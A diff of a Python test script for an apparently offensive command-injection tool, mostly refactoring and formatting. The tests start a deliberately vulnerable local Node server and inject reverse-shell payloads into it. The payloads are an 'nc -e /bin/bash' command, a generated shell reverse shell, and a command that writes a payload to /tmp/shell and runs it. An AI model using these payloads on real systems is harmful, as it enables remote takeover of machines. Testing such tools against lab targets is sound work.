@@ -11,29 +11,47 @@ import pwd
 import time
 import random
 
+from server import ReverseListener
+
+from multiprocessing import Process
+
 backend = 'express'
+
 
 def get_current_user():
     return pwd.getpwuid(os.getuid())[0]
 
+
 def run_test_server():
     if backend == 'express':
-        os.system('cd test_js && node vulnserver.js > /dev/null 2> /dev/null')
+        os.system('cd test_js && node vulnserver.js > /dev/null')
     else:
         app.run(debug=True, port=3111)
 
-from multiprocessing import Process
 
-srv_proc = Process(target=run_test_server)
-srv_proc.start()
+srv_proc = None
 
-time.sleep(1) # wait for server to start
 
-from server import ReverseListener
+def start_test_server():
+    global srv_proc
+    srv_proc = Process(target=run_test_server)
+    srv_proc.start()
+
+
+start_test_server()
+
+time.sleep(1)  # wait for server to start
 
 url = 'http://127.0.0.1:3111/home'
 
-monkey = Monkey(url)
+try:
+    monkey = Monkey(url)
+except Exception:  # todo what exception is that?
+    print("Probably node modules aren't installed, installing")
+    os.system('cd test_js && npm i')
+    time.sleep(15)
+    start_test_server()
+    monkey = Monkey(url)
 
 print('-------------------------Parsing tests-------------------------------')
 
@@ -60,7 +78,7 @@ assert res.decode() == 'SUCCESS'
 
 print('PASSED✓')
 
-print('-------------------------JS urls submit tests---------------------------')
+print('------------------------JS urls submit tests--------------------------')
 
 injectable = {}
 inputs = monkey.get_inputs()
@@ -86,7 +104,7 @@ listener.start()
 
 print('----------------netcat:----------------')
 
-res = monkey.inject_fetch({ 'command': f"nc {ip} {port} -e /bin/bash\n" })
+res = monkey.inject_fetch({'command': f"nc {ip} {port} -e /bin/bash\n"})
 
 assert res.decode() == 'SUCCESS'
 assert get_current_user() == listener.get_recv().strip()
@@ -107,7 +125,7 @@ listener.start()
 payload = Generator.shell_reverse_shell(lhost=ip, lport=port, s='sh')
 print('injecting payload:', payload)
 
-res = monkey.inject_fetch({ 'command': payload })
+res = monkey.inject_fetch({'command': payload})
 
 assert res.decode() == 'SUCCESS'
 assert get_current_user() in listener.get_recv().strip()
@@ -130,7 +148,7 @@ assert payload is not None
 
 cmd = f'printf "{payload}" > /tmp/shell && chmod +x /tmp/shell && /tmp/shell'
 
-res = monkey.inject_fetch({ 'command': cmd })
+res = monkey.inject_fetch({'command': cmd})
 
 assert res.decode() == 'SUCCESS'
 assert get_current_user() in listener.get_recv().strip()
